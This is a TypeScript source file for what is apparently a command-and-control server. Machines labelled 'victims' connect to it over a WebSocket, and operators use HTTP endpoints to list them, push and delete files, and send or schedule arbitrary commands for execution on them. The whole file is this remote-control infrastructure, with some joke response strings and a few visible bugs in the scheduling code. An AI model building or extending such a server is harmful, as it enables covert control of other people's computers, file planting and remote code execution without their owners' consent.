import WebSocketServer, { WebSocket } from "ws"
import TaskVariable from "./TaskVariable";
import path from "path"
import express from "express"
import fs from "fs";
import Task from "./Task";
import { uniqueNamesGenerator, Config, adjectives, colors, animals } from 'unique-names-generator';
import ScheduledTask from './ScheduledTask';
import VariableHolder from "./VariableHolder";
import ScheduleType from "./ScheduleType";
import TaskVariableType from "./TaskVariableType";
import WebsocketMessage from "./WebsocketMessage";
import { json } from "body-parser";
import Victim from "./Victim";
var cors = require("cors");
const app = express();
const apiPort = 8080; 
var bodyParser = require('body-parser')

app.use(bodyParser.urlencoded({ extended: false }))

// parse application/json
app.use(bodyParser.json({limit: '50mb'}))


const wss : WebSocketServer.Server = new WebSocketServer.Server({port: 25565});

interface Response{
    [key: string]: any;
}

var taskContent: Response = require("./tasks.json");
var tasks: Response = {};
for(let i in taskContent){
    let task: Task = taskContent[i] as Task;
    tasks[task.id] = task
}

var scheduledTaskContent: Response = require("./scheduledTasks.json");
var scheduledTasks: Response = {}
for(let i in scheduledTaskContent){
    let scheduledTask: ScheduledTask = scheduledTaskContent[i] as ScheduledTask;
    scheduledTasks[scheduledTask.name] = scheduledTask
}

const victims: Map<any, Victim> = new Map();

wss.on("connection", (ws, message) => {
    if("device-name" in message.headers){
        var deviceName = message.headers["device-name"] as string;
        victims.set(deviceName, {
            "ws": ws,
            "debugLines": [],
            "devName": deviceName,
            "fileNames": []
        });  

        sendDownloadQueryToVictim(victims.get(deviceName) as Victim);

        console.log(`New device connected! ${deviceName}`)
    } else{
        ws.close()
    }

    ws.on("message", (data) => {
        var jsonData: WebsocketMessage = JSON.parse(data.toString());
        var victim: Victim = victims.get(jsonData.deviceName) as Victim;
        console.log("Message Recieved from " + victim.devName);

        if(jsonData.messageType == "PRINT"){
            victim.debugLines.push(jsonData.content);
            console.log(`${victim.devName} just printed: \n${jsonData.content}`)
        }
        if(jsonData.messageType == "DOWNLOADED_FILES"){
            victim.fileNames = jsonData.content;
        }
    })

    ws.on("close", (code, reason)=> {
        console.log(`Websocket ${message.headers["device-name"]} closed`)
        victims.delete(message.headers["device-name"]);
    })
});

function sendDownloadQueryToVictim(victim: Victim){
    victim.ws.send(JSON.stringify({
        "messageType": "QUERYDOWNLOADS",
        "content": "kill"
    }))
}

setInterval(()=> {
    for(let victim of victims.values()){
        sendDownloadQueryToVictim(victim);
    }
}, 20 * 1000)

app.use(cors())

app.get("/devices", (req, res) => {
    var responseObj: Response = {}
    responseObj["message"] = "Device list";
    responseObj["data"] = new Array<Victim>();
    var keys = victims.forEach((value, key, map) => {
        var devList: Array<string> = responseObj["data"];
        devList.push(JSON.stringify(value));
    })
    res.send(JSON.stringify(responseObj));
});

app.get("/getFiles", (req,res)=> {
    res.send({"shush": "infant"})

})

app.get("/device", (req, res) => {
    var responseObj: Response = {}
    
    if(!("device-id" in req.headers)){
        responseObj["message"] = "Device-ID Not Found in Headers";
        res.status(400);
        res.send(JSON.stringify(responseObj));
    }

    if(!victims.has(req.headers["device-id"])){
        responseObj["message"] = "Device Not Found";
        res.status(400);
        res.send(JSON.stringify(responseObj));
    } 
    else {
        responseObj["message"] = "Device Found";

        var data: Response = {};
        responseObj["data"] = victims.get(req.headers["device-id"]);

        res.status(200);
        res.send(JSON.stringify(responseObj));
    }
})

app.post("/createTask", (req, res) => {

    const customConfig: Config = {
        dictionaries: [adjectives, colors, animals],
        separator: '-',
        length: 3,
    };
    var id = uniqueNamesGenerator(customConfig);

    var newTask : Task = {
        "name": id,
        "id": id,
        "content": "",
        variables: new Array<TaskVariable>()
    };

    tasks[newTask.name] = newTask

    saveTasks();

    var responseData: Response = {}
    
    responseData["message"] = "Task created successfully";
    responseData["data"] = {
        "taskID": newTask.name
    }

    res.send(JSON.stringify(responseData))
})

app.get("/getTasks", (req,res) => {
    var responseData: Response = {}
    
    responseData["message"] = "Tasks returned successfully";
    responseData["data"] = {
        "tasks": tasks
    }

    res.send(JSON.stringify(responseData))
})

app.get("/getTask", (req, res) => {
    var responseData: Response = {}

    if(!("task-id" in req.headers)){
        responseData["message"] = "Task-ID Not Found in Headers";
        res.status(400);
        res.send(JSON.stringify(responseData));
    } else{
        var taskName: string = req.headers["task-id"] as string
        responseData["message"] = "Task returned successfully";
        responseData["data"] = {
            "task": tasks[taskName]
        }
    
        res.send(JSON.stringify(responseData));
    }
});

app.post("/deleteTask", (req, res) => {


    if(!("taskID" in req.body)){
        res.status(400);
        var response: Response = {}
        response["message"] = "Malformed Request. No taskID in req body";
        res.send(response);
        return;
    }else{
        delete tasks[req.body["taskID"]];
        saveTasks();
    }

    var responseData: Response = {}
    responseData["message"] = "Task deleted successfully";
    res.send(JSON.stringify(responseData))
});

app.post("/editTask", (req, res) => {
    if(!("taskID" in req.body)){
        res.status(400);
        var response: Response = {};
        response["message"] = "Malformed Request. No taskID in req body";
        res.send(response);
        return;
    }

    if(!("taskJSON" in req.body)){
        res.status(400);
        var response: Response = {};
        response["message"] = "Malformed Request. No taskJSON in req body";
        res.send(response);
        return;
    }

    tasks[req.body["taskID"]] = req.body["taskJSON"];

    saveTasks();

    var responseData: Response = {}
    responseData["message"] = "Task edited successfully";
    res.send(JSON.stringify(responseData));
});

app.post("/scheduleTask", (req,res) => {
    var checks: Array<boolean> = [];
    checks.push(checkIfValueInJson(req.body, "scheduleJSON", res));
    checks.push(checkIfValueInJson(req.body["scheduleJSON"], "deviceID", res));
    checks.push(checkIfValueInJson(req.body["scheduleJSON"], "id", res));
    checks.push(checkIfValueInJson(req.body["scheduleJSON"], "name", res));
    checks.push(checkIfValueInJson(req.body["scheduleJSON"], "scheduleData", res));
    checks.push(checkIfValueInJson(req.body["scheduleJSON"], "type", res));
    var scheduleJSON = req.body["scheduleJSON"]
    if(scheduleJSON["type"] === "Future"){
        checks.push(checkIfValueInJson(scheduleJSON["scheduleData"], "date", res));
        checks.push(checkIfValueInJson(scheduleJSON["scheduleData"], "time", res));
    } else if(scheduleJSON["type"] === "Recurring"){
        checks.push(checkIfValueInJson(scheduleJSON["scheduleData"], "days", res));
        checks.push(checkIfValueInJson(scheduleJSON["scheduleData"], "time", res));
    } else if(scheduleJSON["type"] === "Recurring"){
        checks.push(checkIfValueInJson(scheduleJSON["scheduleData"], "interval", res));
    }

    var variablesHolder: VariableHolder = scheduleJSON["variables"] as VariableHolder;
    for(const x in variablesHolder.vars){
        checks.push(checkIfValueInJson(x, "name", res));
        checks.push(checkIfValueInJson(x, "value", res))
    }
    
    var allGood = true;

    for(let x of checks){
        if(!x){
            allGood = x;
        }
    }
    
    if(allGood){
        var taskToSchedule: ScheduledTask = scheduleJSON as ScheduledTask;
        if(!victims.has(taskToSchedule.deviceID)){
            res.status(400);
            var response: Response = {};
            response["message"] = `Malformed Request. Cannot find device id`;
            res.send(response);
            return;
        }
        scheduledTasks[scheduleJSON["name"]] = taskToSchedule
        var responseData: Response = {}
        responseData["message"] = "Task scheduled successfully";
        res.send(JSON.stringify(responseData));
        saveScheduledTasks();
    }
})

app.get("/getScheduledTasks", (req,res) => {
    var responseData: Response = {}
    
    responseData["message"] = "Scheduled tasks returned successfully";
    responseData["data"] = {
        "tasks": scheduledTasks
    }

    res.send(JSON.stringify(responseData))
})

app.post("/unscheduleTask", (req,res)=> {
    if(!checkIfValueInJson(req.body, "scheduleID", res)){
        return;
    }else{
        delete scheduledTasks[req.body["scheduleID"]];
        saveScheduledTasks();
    }

    var responseData: Response = {}
    responseData["message"] = "Scheduled task deleted successfully";
    res.send(JSON.stringify(responseData))
});

app.post("/uploadFile", (req, res) => {
    if(!checkIfValueInJson(req.body, "fileName", res)){
        return;
    }

    if(!checkIfValueInJson(req.body, "fileContents", res)){
        return;
    }
    if(!checkIfValueInJson(req.body, "deviceName", res)){
        return;
    }

    if(victims.has(req.body["deviceName"])){
        victims.get(req.body["deviceName"])?.ws.send(JSON.stringify({
            "messageType": "DOWNLOAD",
            "content": req.body["fileContents"],
            "fileName": req.body["fileName"]
        }));

        setTimeout(() => {
            sendDownloadQueryToVictim(victims.get(req.body["deviceName"]) as Victim)
        }, 1000)
        
    }
    res.send({"give nutrient": "no buy my nutrient for $10.99"});
});

app.post("/sendJSON", (req,res)=> {
    if(!checkIfValueInJson(req.body, "deviceName", res)){
        return;
    }

    if(!checkIfValueInJson(req.body, "jsonContent", res)){
        return;
    }

    if(victims.has(req.body["deviceName"])){
        victims.get(req.body["deviceName"])?.ws.send(JSON.stringify(req.body["jsonContent"]));
    }

    res.send({"the last thing i ever said to my grandpa": "was you are a coward"})
})

app.post("/deleteFile", (req,res)=> {
    if(!checkIfValueInJson(req.body, "deviceName", res)){
        return;
    }

    if(!checkIfValueInJson(req.body, "fileName", res)){
        return;
    }

    if(victims.has(req.body["deviceName"])){
        victims.get(req.body["deviceName"])?.ws.send(JSON.stringify({
            "messageType": "DELETE",
            "content": req.body["fileName"]
        }));

        setTimeout(() => {
            sendDownloadQueryToVictim(victims.get(req.body["deviceName"]) as Victim)
        }, 1000)
    }

    res.send({"the last thing i ever said to my grandpa": "was you are a coward"})
})

function checkIfValueInJson(jsonObj: any, value: string, res: any) : boolean{
    if(!(value in jsonObj) || jsonObj[value] === ""){
        res.status(400);
        var response: Response = {};
        response["message"] = `Malformed Request. No ${value} in req body`;
        res.send(response);
        return false;
    } else{
        return true;
    }
}

function saveTasks(){
    fs.writeFileSync(path.join(__dirname, "tasks.json"), JSON.stringify(tasks));
    console.log("tasks saved");
}

function saveScheduledTasks(){
    fs.writeFileSync(path.join(__dirname, "scheduledTasks.json"), JSON.stringify(scheduledTasks));
}

function checkIfTasksShouldFire(){
    var currentDate: Date = new Date();
    var dateString: string = `${currentDate.getFullYear()}-${currentDate.getMonth()}-${currentDate.getDay()}`
    var timeString: string = `${currentDate.getHours}:${currentDate.getMinutes()}`;

    for(const task in scheduledTasks){
        var scheduledTask: ScheduledTask = scheduledTasks[task] as ScheduledTask;
        if(scheduledTask.type === "Now"){
            executeScheduledTask(scheduledTask);
            unscheduleTask(scheduledTask.name);
        }
        if(scheduledTask.type === "Future"){
            var executeDate: string = scheduledTask.scheduleData["date"];
            var executeTime: string = scheduledTask.scheduleData["time"];

            if(dateString === executeDate && timeString === executeTime){
                executeScheduledTask(scheduledTask);
                unscheduleTask(scheduledTask.name);
            }
        }
    }
}

function unscheduleTask(name: string){
    delete scheduledTasks[name];
    saveScheduledTasks();
}

function executeScheduledTask(scheduledTask: ScheduledTask){
    var deviceID: string = scheduledTask.deviceID;
    if(victims.has(deviceID)){
        console.log(scheduledTask.id)
        var task: Task = tasks[scheduledTask.id] as Task;
        console.log(task)
        var content: string = task.content;
        //TODO: variables
        for(let variable in scheduledTask.variables){
            content = content.replaceAll(scheduledTask.variables[variable].name, scheduledTask.variables[variable].value);
        }

        victims.get(deviceID)?.ws.send(JSON.stringify({
            "messageType": "EXECUTE",
            "content": content
    }));

    console.log(`Sending task ${task.id} to ${deviceID}`);
    }
}

setInterval(checkIfTasksShouldFire, 5);


app.listen(apiPort, () => {
    console.log("express online");
});

